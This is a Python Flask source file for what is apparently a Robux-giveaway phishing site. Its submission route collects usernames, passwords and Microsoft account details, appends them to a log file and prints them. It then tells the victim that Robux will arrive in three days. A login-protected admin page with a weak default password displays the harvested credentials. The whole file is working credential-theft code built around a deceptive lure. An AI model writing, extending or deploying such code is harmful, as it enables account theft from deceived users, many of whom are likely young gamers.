from flask import Flask, render_template, request, session, redirect, url_for
import os

app = Flask(__name__)

# IMPORTANT: Set these as Environment Variables in your hosting service (e.g., Render)
# The second value is a fallback for local testing and should not be used in production.
app.secret_key = os.environ.get('SECRET_KEY', 'is_this_a_secret')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# This route serves your HTML file
@app.route('/')
def index():
    return render_template('index.html')

# This route handles the form submission
@app.route('/submit', methods=['POST'])
def handle_submission():
    username = request.form.get('username')
    extra_text = request.form.get('text')
    reward_type = request.form.get('reward')
    confirmation = request.form.get('Conformation')
    microsoft_app = request.form.get('ji')

    log_entry = f"User: {username} | password: {extra_text} | Reward: {reward_type} | MSFT User: {confirmation} | MSFT App: {microsoft_app}\n"

    # Save the data to the log file
    with open("survey_log.txt", "a") as file:
        file.write(log_entry)

    # Also print to console for live debugging on Render/Heroku
    print("--- NEW FORM SUBMISSION ---")
    print(log_entry.strip())
    print("--------------------------")

    return f"<h1>Submission Received!</h1><p>Thanks {username}, we will verify your account, and robux will be sent to you in 3 days</p>"

# ---- Admin Section ----

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid password'
    return render_template('login.html', error=error)

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    data = ""
    if os.path.exists("survey_log.txt"):
        with open("survey_log.txt", "r") as file:
            data = file.read()
            
    return render_template('admin.html', data=data)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(debug=True, port=5000)
